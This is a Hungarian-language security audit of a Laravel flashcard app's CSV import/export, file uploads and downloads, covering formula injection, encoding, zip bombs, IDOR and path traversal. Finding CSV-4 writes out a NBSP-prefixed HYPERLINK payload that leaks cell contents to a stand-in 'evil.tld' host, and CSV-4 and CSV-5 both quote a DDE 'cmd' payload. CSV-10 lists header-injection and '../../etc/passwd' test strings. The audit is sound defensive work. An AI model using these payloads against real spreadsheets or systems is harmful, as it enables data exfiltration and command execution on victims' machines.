# Fázis 6 / DIMENZIÓ 4 — CSV & fájl import-export edge-esetek

**Dátum:** 2026-07-27
**Hatókör:** `FlashcardCsvController` (import+export), `TextAnalysisController@uploadBook/storeYoutube/deleteYoutube`, `UserBook`/`YoutubeTranscript` gzip, `DownloadController`, `SubscriptionController@downloadInvoice`, `ImportWords`
**Kizárva:** kvíz / cloze / rendhagyó igék / szabad írás (kivezetett feature-k)
**Módosítás:** NINCS — csak dokumentálás.

## Összefoglaló

| Súlyosság | Darab | ID-k |
|---|---|---|
| HIGH | 0 | — |
| MEDIUM | 1 | CSV-4 |
| LOW | 4 | CSV-5, CSV-6, CSV-7, FILE-3 |
| INFO | 8 | CSV-8..CSV-10, FILE-4..FILE-8 |

**Előző körhöz képest:** a 2026-07-20-i **CSV-1 „formula-injection védelem CONFIRMED tiszta" verdiktet MEGDÖNTÖM** — két, mérésben reprodukált bypass (CSV-4 MEDIUM, CSV-5 LOW). A **CSV-2 (encoding-normalizálás hiánya) LOW-t LEZÁRTNAK** találom: azóta bekerült a `normalizeEncoding()` (cp1252 fallback), a maradék UTF-16-hézag új, szűkebb leletként CSV-6.

Mért adatok: az import memória-profilja **ártalmatlan** (2 MB-os fájl, 5000 soros sapka → **csúcs 6 MB, 8,2 ms**), a `fgetcsv` streamel, nincs OOM-vektor.

---

## MEDIUM

### CSV-4 — Unicode-whitespace prefix megkerüli a CSV formula-injection védelmet
**Fájl:sor:** `app/Http/Controllers/FlashcardCsvController.php:200`
**Súlyosság:** MEDIUM
**Verdikt:** **CONFIRMED** (mérve, teljes import→DB→export round-trip)

**Kód:**
```php
if ($field !== '' && in_array($field[0], ['=', '+', '-', '@'], true)) {
    $field = "'".$field;
}
```

**A hiba lényege:** két egymást erősítő rés.

1. **`$field[0]` BÁJTOT olvas, nem karaktert.** Egy UTF-8 multibyte-karakterrel kezdődő mező első bájtja soha nem `=`/`+`/`-`/`@`, így a kapu vakon átengedi.
2. **A `trim()` a `stripHtml()`-ben csak ASCII whitespace-t vág** (`" \t\n\r\0\x0B"`). Az U+00A0 (NBSP) és U+200B (ZWSP) **átmegy** — miközben az Excel/LibreOffice a vezető NBSP-t figyelmen kívül hagyja a képlet-felismerésnél.

**Támadási forgatókönyv (bemenet → hatás):**

1. A támadó egy közösen használt/megosztott gépen, vagy a saját fiókjából egy áldozatnak továbbadott CSV-vel, kártyát hoz létre, aminek a `front` mezője:
   `"\u{00A0}=HYPERLINK(\"http://evil.tld/?x=\"&A1,\"Kattints\")"`
   (felvihető a webes editorból, a Chrome-extensionből, vagy egy CSV-importból — a `textToHtml()` az NBSP-t nem bántja).
2. Az áldozat (vagy a támadó maga, hogy az exportot továbbküldje) meghívja a `GET /flashcards/{deck}/csv-export`-ot.
3. **Mért kimenet:**
   ```
   export mező bájtjai: c2 a0 3d 48   (NBSP, '=', 'H')
   export CSV sor: " =HYPERLINK(""http://evil.tld/?x=""&A1,""Kattints""),"b","",""
   ==> a prefix aposztróf HIÁNYZIK
   ```
   A `csvRow()` **nem** teszi ki a védő `'`-t.
4. Az áldozat Excelben nyitja meg → a cella élő `HYPERLINK`/`DDE` képletként értékelődik ki → adat-kiszivárogtatás (`&A1` a szomszédos cella tartalmát a támadó szerverére küldi kattintásra), vagy `=cmd|' /C calc'!A0` DDE-vektor régi Excelben.

**Verifikáció:** a `csv_probe.php`/`csv_probe2.php` a controller privát helpereit 1:1 újraimplementálva futott. A `plain equals`, `TAB prefix`, `CR prefix`, `LF prefix`, `space prefix`, `@` vektorokat a védelem **helyesen fogta** (a `trim()` levágta az ASCII whitespace-t, majd a `=` látszott). Az **NBSP (U+00A0) és a ZWSP (U+200B) mindkettő átment**:
```
NBSP U+00A0   afterStrip=" =1+1"   csv="\" =1+1\",..."   <- nincs aposztróf
ZWSP U+200B   afterStrip="​=1+1"   csv="\"​=1+1\",..."   <- nincs aposztróf
```
Külön ellenőrizve: `in_array(trim($nbsp)[0], ['=','+','-','@'], true) === false`, mert `trim($nbsp)[0] === "\xC2"`.

**Miért MEDIUM és nem HIGH:** nincs pakli-megosztás a rendszerben (ellenőrizve: a `FlashcardDeck` modellen nincs `shared`/`public`/`clone` reláció, az export `abort_unless($deck->user_id === ...)`-szal self-only). A támadónak tehát **a CSV-fájlt kézzel kell eljuttatnia az áldozathoz** (e-mail, chat) — nincs olyan in-app útvonal, ahol A felhasználó adata B exportjába kerülne. Ez klasszikus „exportált fájl mint fegyver" eset: valós, de kézbesítést igényel, és az áldozat Excel-verziójától/makró-beállításától is függ.

**Megjegyzés a súly-vitához:** a régebbi audit CSV-1-et azért találta tisztán, mert csak ASCII-prefixeket próbált. A `$field[0]` bájt-indexelés a gyökérok — ugyanez a minta minden nem-ASCII kezdetű mezőt átenged.

---

## LOW

### CSV-5 — Beágyazott sortörés: a többsoros cella 2. sora védelem nélküli
**Fájl:sor:** `app/Http/Controllers/FlashcardCsvController.php:196-210` (`csvRow`), `191` (`stripHtml`)
**Súlyosság:** LOW
**Verdikt:** **CONFIRMED** (a nyers CSV-bájtok mérve) — **de a kihasználhatóság PLAUSIBLE**

**Forgatókönyv:** egy kártya, aminek a tárolt HTML-je `<p>Hello</p><p>=cmd|' /C calc'!A0</p>` (a webes editorban két bekezdés, vagy CSV-importból többsoros mező). A `stripHtml()` a `</p><p>` határt `\n`-né alakítja, így a mező `"Hello\n=cmd|' /C calc'!A0"`. A `csvRow()` **csak az első karaktert** nézi (`H`) → nincs aposztróf. Mért kimenet:
```
"Hello
=cmd|' /C calc'!A0","b","",""
```
A nyers fájlban tehát **létezik egy `=`-lel kezdődő fizikai sor**.

**Miért LOW:** a mező idézőjelek közé van zárva, és a szabványos CSV-parser (Excel is) az idézőjelen belüli sortörést **egy cellának** olvassa — a cella tartalma `Hello\n=...`, ami nem képlet, mert nem `=`-lel kezdődik. Verifikálva: a `fgetcsv(..., ',', '"', '')` visszaolvasás egyetlen mezőt adott vissza. A kockázat akkor materializálódik, ha a fájlt egy **naiv, sor-alapú** feldolgozó (`explode("\n")`, egyszerű script, más rendszer importja) olvassa — ott a 2. sor önálló, `=`-lel kezdődő rekordként jelenik meg. Nincs ilyen fogyasztó a projektben, ezért LOW.

### CSV-6 — UTF-16 CSV némán szemétté válik (a cp1252-fallback nem fedi)
**Fájl:sor:** `app/Http/Controllers/FlashcardCsvController.php:157-164` (`normalizeEncoding`)
**Súlyosság:** LOW (adatminőség, nem biztonság)
**Verdikt:** **CONFIRMED** (mérve)

A `normalizeEncoding()` helyesen kezeli a cp1252-t (ez a korábbi CSV-2 lelet javítása — **azt LEZÁRTNAK tekintem**), de az UTF-16-ot nem. Mért:
```
UTF-16LE bemenet "elöl,hátul" ->
  fgetcsv: [["e\0l\0ö\0l\0", "\0h\0á\0t\0u\0l\0"], ["\0"]]
  normalizeEncoding után: változatlan (a NUL-os bájtsor VALID UTF-8-nak számít)
```
**Forgatókönyv:** a felhasználó Excelből „Unicode szöveg (*.txt)" formátumban ment (ez UTF-16LE), átnevezi `.csv`-re, importál → 5000 kártya jön létre NUL-bájtokkal tarkított, olvashatatlan tartalommal. Nincs hibajelzés (a `mb_check_encoding` `true`-t ad), a `skipped` számláló 0. Hatás: adatminőség-romlás + a kártyakeret elfogyasztása. Nincs biztonsági következmény. Az UTF-16 BOM (`\xFF\xFE`) sem detektált — a `bom` check csak az UTF-8 BOM-ot (`\xEF\xBB\xBF`) vizsgálja.

### CSV-7 — A `;`-elválasztójú (magyar Excel) CSV egyoszlopos sorként némán kihagyódik
**Fájl:sor:** `app/Http/Controllers/FlashcardCsvController.php:48`
**Súlyosság:** LOW (UX/adatminőség)
**Verdikt:** **CONFIRMED** (mérve)

A `fgetcsv($handle, null, ',', '"', '')` fixen vesszőt vár, nincs elválasztó-detektálás. Magyar (és általában EU-s) Windows-on az Excel alapértelmezetten **pontosvesszőt** ír. Mért:
```
"elöl;hátul\nmásik;sor" -> [["elöl;hátul"], ["másik;sor"]]
```
Ezek `count($row) < 2` miatt a `skipped++` ágra futnak.
**Forgatókönyv:** a magyar felhasználó exportál Excelből, importál → *„0 kártya importálva, 250 kihagyva"*, magyarázat nélkül. Nem biztonsági rés; az üzenet legalább jelzi a kihagyást (nem teljesen néma). Ugyanez igaz a TAB-elválasztóra.

### FILE-3 — `YoutubeTranscript::segments()` elnyomatlan `gzdecode()` → PHP warning korrupt bloboknál
**Fájl:sor:** `app/Models/YoutubeTranscript.php:27`
**Súlyosság:** LOW
**Verdikt:** **CONFIRMED** (mérve) — **a zip-bomba-vektor REFUTED**

```php
return json_decode(gzdecode($this->compressed_segments), true) ?: [];
```
A `UserBook::getPage()` párja `@gzdecode()`-ot használ (elnyomott), itt nincs `@`. Mért: korrupt bemeneten `gzdecode()` **`E_WARNING`-ot bocsát ki** (`gzdecode(): data error`), majd `false`-t ad; a `json_decode(false)` `NULL`, a `?: []` fallback pedig üres tömbre visz. Tehát **nem dob kivételt, nem 500-azik** — a hatás csak annyi, hogy a log megtelik warninggal (és ha az `AlertAdminOfLoggedError` a warningokra is riaszt, e-mail-zaj).

**A zip-bomba / user-vezérelt bájtfolyam REFUTED.** Ellenőrizve, hogy létezik-e bármilyen út, amin támadó által kontrollált bájt kerülhet a `gzdecode()`-ba:
- A `compressed_text`/`compressed_segments` oszlopokat **kizárólag a szerver írja**, mindig `gzencode()` kimenetével (`TextAnalysisController:1575`, `:1709`).
- Mindkét `create()` **explicit tömböt** kap (`:1602`, `:1719`) — nincs `$request->all()`, nincs mass-assignment-út a blob-mezőkre, noha azok szerepelnek a `$fillable`-ben.
- Nincs más író hely a kódbázisban (teljes `grep` a `compressed_*`-ra).

Ezért korrupt blob csak DB-szintű sérülésből vagy adatbázis-hozzáféréssel rendelkező támadótól származhat — az utóbbi esetben már régen vesztettünk. A „kicsi tömörített → óriási kicsomagolt" bombához a támadónak a bloboszlopba kellene írnia, ami nem lehetséges.

---

## INFO

### CSV-8 — Import memória-profil: ártalmatlan, streamel
**Verdikt:** REFUTED (nincs OOM-vektor). Mért adatok:

| Eset | Fájlméret | Feldolgozva | Csúcs-memória | Idő |
|---|---|---|---|---|
| 2 KB/soros fájl a `max:2048` határon | 2049 KB | 1048 sor | **4 MB** (delta 2 MB) | — |
| 200 000 rövid sor (worst case sor-szám) | 1172 KB | 5000 sor (sapka) | **6 MB** | **8,2 ms** |

Az import **streamel** (`fopen` + `fgetcsv` soronként), nincs `file()`/`file_get_contents`. A védelmi rétegek egymást fedik: `max:2048` (2 MB) a validációban, `MAX_IMPORT_ROWS = 5000`, `MAX_FIELD_LENGTH = 10000` karakter/mező. A `php.ini` `upload_max_filesize=100M` / `post_max_size=120M` bőven a validációs sapka felett van, tehát a `max:2048` az effektív korlát (a nagyobb feltöltést a Laravel validáció utasítja el, nem a PHP). A `memory_limit` CLI-n 128M, a XAMPP php.ini-ben 512M — mindkettő nagyságrendekkel a mért 6 MB felett.

### CSV-9 — A kártyakeret-kapu a feldolgozás UTÁN, de az insert-tel egy záron belül fut → TOCTOU tiszta
**Verdikt:** REFUTED (nincs keret-megkerülés). `FlashcardCsvController:92` → `User::reserveFlashcardSlots()` (`app/Models/User.php:313`): a `canAddFlashcards($count)` ellenőrzés és az `insert()` **ugyanazon `plan-limit:flashcards:{id}` Cache-lock alatt** fut (`block(10)`), tehát párhuzamos importok nem mehetnek át ugyanazon az elavult kártyaszámon. A `LockTimeoutException` kezelt (`:99`), barátságos hibaüzenettel. A `DB::transaction()` 500-as chunkokkal atomikus — **nincs részleges import**. A sorszám-sapka logikája is helyes: a `count($rows) >= 5000` check a hozzáadás ELŐTT fut, tehát pontosan 5000 sor kerül be (nincs off-by-one).

### CSV-10 — Export-fájlnév: header-injection és path traversal kizárva
**Fájl:sor:** `FlashcardCsvController.php:132`
**Verdikt:** REFUTED. A `preg_replace('/[^a-zA-Z0-9_-]/', '_', $deck->name)` **allowlist** — minden más karaktert aláhúzásra cserél. Mért:
```
"a\"; filename=\"evil.html"  -> "a___filename__evil_html.csv"
"a\r\nX-Injected: 1"          -> "a__X-Injected__1.csv"
"../../etc/passwd"            -> "______etc_passwd.csv"
```
CR/LF, idézőjel, `/`, `..` mind semlegesítve. Apró kozmetikai mellékhatás: az ékezetes paklinevek olvashatatlanná válnak (`normál pakli` → `norm__l_pakli.csv`) — nincs `filename*=UTF-8''` RFC 5987 fallback. Ez UX, nem biztonság. Nincs hossz-korlát a fájlnéven (300 karakteres név → 300+ karakteres header), de ez sem támadható.

### FILE-4 — EPUB feltöltés: zip-bomba fail-closed, méret-sapkák láncolva
**Verdikt:** REFUTED (a védelem teljes). `TextAnalysisController:1673` validáció: `mimetypes:application/epub+zip,application/zip` + `extensions:epub` + `max:30720` (30 MB). A kicsomagolás a `safeReadZipEntry()`-n megy (`:2130`): a `statName()['size']`-ból a **kibontás ELŐTT** dönt, `MAX_EPUB_ENTRY_BYTES = 5 MB` per-entry. Efölött kumulatív sapka is van (`MAX_EPUB_TOTAL_BYTES = 40 MB`, `:1868`), ami több nagy entry együttes hatását is fogja, majd a kinyert szövegre `MAX_BOOK_TEXT_BYTES = 10 MB` (`assertBookTextWithinCap`, `:746`). A `match` default ága (`:1694`) második védvonalként dob, ha a validáció valaha új formátumot engedne be. Az `extractEpubText` minden `\Throwable`-je 422-vé fordul (`:1698`), nincs nyers 500. A `normalizePath()` (`:2109`) a `..` szegmenseket kiveszi az OPF-hivatkozásokból — bár ez ZIP-en belüli név, nem fájlrendszer-út, tehát traversal amúgy sem fenyegetne.

### FILE-5 — YouTube-transcript méret-lánc lezárt
**Verdikt:** REFUTED. `MAX_TRANSCRIPT_BYTES = 12 MB` a **tömörített** blobra (`:1591`), a MEDIUMBLOB 16 MB-os határa alatt biztonsági ráhagyással → nincs kezeletlen „Data too long" 500. A memória-oldali sapka feljebb, a `YouTubeCaptionService::MAX_CAPTION_BYTES`-nál (8 MB) van. A darabszám-kapu ugyanazzal a lock-mintával fut, mint a kártyáknál (`plan-limit:youtube:{id}`, `:1597`) — a gyors előszűrés a drága letöltés előtt, a valódi kapu a lock alatt.

### FILE-6 — Könyv/felirat IDOR: minden végpont scope-olt
**Verdikt:** REFUTED. Ellenőrizve mind a 7 route-model-bound végpont: `getBookPage:1747`, `bookOverview:1760`, `deleteBook:1828`, `getYoutubePage:1628`, `youtubeOverview:1643`, `deleteYoutube:1656` — mindegyik `abort_unless($x->user_id === $request->user()->id, 403)`. A CSV import/export ugyanígy (`:25`, `:128`). Nincs `{deck}`/`{book}`/`{transcript}` implicit binding tulajdonos-ellenőrzés nélkül. **IDOR = 0 ezen a felületen.**

### FILE-7 — `DownloadController`: allowlist-alapú, path traversal kizárva
**Verdikt:** REFUTED. `app/Http/Controllers/DownloadController.php:16-31`: a publikus slug (`extension`/`player-mac`/`player-win`) egy `const FILES` térképen keresztül fordul fájlnévre, `abort_unless(array_key_exists(...), 404)`. A route-paraméter **soha nem kerül a fájlútvonalba**, tehát `../` beadása 404. A route throttle-özött (`throttle:20,1,downloads`, `routes/web.php:70`). Streamelt letöltés, nincs memóriába olvasás.

### FILE-8 — Számla-PDF passthrough: tulajdonos-ellenőrzött, fájlnév sanitizált
**Verdikt:** REFUTED. `app/Http/Controllers/Settings/SubscriptionController.php:94-118`: `abort_unless($invoice->user_id === $request->user()->id, 404)` + `abort_unless($invoice->isIssued(), 404)`. A fájlnév a `invoice_number`-ből jön `str_replace('/', '-')`-szel (`:111`) — a Billingo-számlaszám formátuma amúgy is korlátozott, és a `/` az egyetlen releváns karakter. A PDF-bájtok a Billingo API-ból jönnek, nem user-inputból. A `HttpClientException` kezelt → 404 nyers stack trace helyett. Route throttle-özött (`throttle:30,1`).

### FILE-9 — `ImportWords` nem olvas CSV-t, és nem user-input vezérelt
**Verdikt:** N/A (a vizsgálati felület tévedése). `app/Console/Commands/ImportWords.php:31`: a parancs egy **hardcode-olt GitHub URL-ről** tölt le sortöréssel elválasztott szólistát (`explode("\n")`), nem CSV-t. Nincs user-input, nincs paraméterezhető útvonal. Éles környezetben `ConfirmableTrait`-tel megerősítést kér (P7-L3). A `@file_get_contents` az egész listát memóriába olvassa (~80 KB), majd 500-as chunkokban `upsert`-el — CLI-parancs, nincs terhelési kockázat.

---

## Tesztfuttatás

```
php -d memory_limit=512M vendor/bin/pest --compact \
  tests/Feature/FlashcardCsvImportTest.php tests/Feature/BookUploadTest.php \
  tests/Feature/DownloadTest.php tests/Feature/YouTubeCaptionServiceTest.php

Tests: 24 passed (55 assertions), 3.32s
```
Teszt nem lett módosítva. Megjegyzés: a meglévő CSV-tesztek **nem fedik** a CSV-4 unicode-prefix vektort és a CSV-6 UTF-16 esetet — ezért maradhattak észrevétlenek az előző körben.

## Előző audit-verdiktek felülvizsgálata

| Korábbi lelet | Előző verdikt | Mostani verdikt | Indoklás |
|---|---|---|---|
| CSV-1 formula-injection védelem | CONFIRMED tiszta | **MEGDÖNTVE** | A `$field[0]` bájt-indexelés + ASCII-only `trim()` miatt NBSP/ZWSP prefix átmegy (CSV-4 MEDIUM, mérve) |
| CSV-2 encoding-normalizálás hiánya | LOW, nyitva | **LEZÁRVA** | A `normalizeEncoding()` azóta bekerült (cp1252 fallback, `:157`); a maradék UTF-16-hézag szűkebb új leletként CSV-6 |
